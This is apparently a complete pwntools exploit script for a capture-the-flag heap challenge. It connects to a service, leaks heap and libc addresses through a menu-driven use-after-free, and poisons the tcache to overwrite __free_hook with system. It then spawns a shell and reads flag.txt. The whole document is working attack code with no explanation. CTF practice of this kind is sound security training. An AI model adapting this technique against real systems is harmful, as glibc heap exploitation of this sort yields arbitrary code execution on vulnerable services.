from pwn import *
from time import sleep

context.log_level='DEBUG'
context.terminal = '/bin/bash'

# p = process('.data/admin/strange')
p = remote('10.0.2.2', 7331)
libc = ELF('.data/admin/libc.so.6') # 2.27

p.recvuntil('server\n')
p.send('CoeMjFHDnIF3z1t0xSQCgxAbrIiLII08YVlG927hNFW1tZ8N9X3Md5z6uEFwikWC')


def eat_menu(choice):
    p.recvuntil('choice:\n')
    p.sendline(str(choice))


def write_data(data):
    p.recvuntil('data\n')
    p.send(data)

eat_menu(1)
write_data('A' * 0x78)
write_data('B' * 0x78)

eat_menu(3)
eat_menu(3)
eat_menu(3)
eat_menu(5)
heap_leak1 = u64(p.recvline().strip('\n') + '\x00\x00')
heap_leak2 = u64(p.recvline().strip('\n') + '\x00\x00')
eat_menu(3)

eat_menu(5)
libc_leak = u64(p.recvline().strip('\n') + '\x00\x00')

print('Libc at: ' + hex(libc_leak))
libc.address = libc_leak - 0x3ebca0
# target = libc.symbols['__malloc_hook'] - 0x7
target = libc.symbols['__free_hook']
print('Target is ' + hex(target))

eat_menu(6)
eat_menu(0)

eat_menu(1)
write_data('A' * 0x40)
write_data('B' * 0x40)
eat_menu(3)
eat_menu(4)
eat_menu(0)
eat_menu(1)
write_data(p64(target) + 'i' * 0x40)
write_data(p64(target) + 'i' * 0x40)
eat_menu(0)
eat_menu(1)
write_data('/bin/sh\x00' + ('i' * 0x40))
write_data(p64(libc.symbols['system']))
eat_menu(4)

# p.interactive()

sleep(2)
p.sendline('cat flag.txt')
print(p.recvuntil('}'))

